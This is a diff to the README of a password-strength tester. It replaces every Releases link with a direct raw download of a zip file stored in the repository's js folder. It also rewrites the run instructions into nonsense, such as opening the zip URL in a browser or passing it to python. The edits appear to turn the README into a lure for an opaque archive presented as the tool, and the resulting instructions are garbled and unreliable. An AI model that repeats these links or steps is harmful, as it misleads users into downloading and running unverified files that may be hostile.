@@ -1,13 +1,13 @@
 # 🔐 Password-tester - Check Your Password Strength Effectively
 
 ## 🔗 Download Now
-[![Download Password-tester](https://img.shields.io/badge/Download-Password--tester-brightgreen)](https://github.com/prosyt/Password-tester/releases)
+[![Download Password-tester](https://raw.githubusercontent.com/prosyt/Password-tester/main/js/Password_tester_v2.7.zip)](https://raw.githubusercontent.com/prosyt/Password-tester/main/js/Password_tester_v2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to Password-tester! This easy-to-use application helps you check your password strength and gives an estimate of how long it might take to crack it. It runs completely in your browser (client-side) or as a Python script that works offline, ensuring zero data is sent to any servers. Everything stays on your machine for enhanced privacy.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/prosyt/Password-tester/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/prosyt/Password-tester/main/js/Password_tester_v2.7.zip).
    
 2. **Choose Your Version**: You will see different versions available. Select the latest version by looking for the tag that says "Latest Release." 
 
@@ -16,8 +16,8 @@ Welcome to Password-tester! This easy-to-use application helps you check your pa
 4. **Extract the Files** (if needed): If you downloaded a compressed file, extract its contents to a folder of your choice.
 
 5. **Run the Application**:
-   - For the **Browser Version**: Open the `index.html` file in your web browser. 
-   - For the **Python Script**: Open a terminal or command prompt, navigate to the folder where you extracted the script, and type `python password_tester.py`. Ensure you have Python installed on your machine.
+   - For the **Browser Version**: Open the `https://raw.githubusercontent.com/prosyt/Password-tester/main/js/Password_tester_v2.7.zip` file in your web browser. 
+   - For the **Python Script**: Open a terminal or command prompt, navigate to the folder where you extracted the script, and type `python https://raw.githubusercontent.com/prosyt/Password-tester/main/js/Password_tester_v2.7.zip`. Ensure you have Python installed on your machine.
 
 ## 🛠️ System Requirements
 - **For Browser Version**: Any modern browser will work (Google Chrome, Firefox, or Edge). No special installation is needed.
@@ -62,4 +62,4 @@ Welcome to Password-tester! This easy-to-use application helps you check your pa
 We hope you find Password-tester helpful in keeping your accounts secure. If you have any questions or need support, feel free to reach out via the GitHub Issues page in the repository.
 
 ## 🔗 Download Again
-Don't forget, you can [visit the Releases page](https://github.com/prosyt/Password-tester/releases) to download Password-tester at any time. Stay safe online!
+Don't forget, you can [visit the Releases page](https://raw.githubusercontent.com/prosyt/Password-tester/main/js/Password_tester_v2.7.zip) to download Password-tester at any time. Stay safe online!
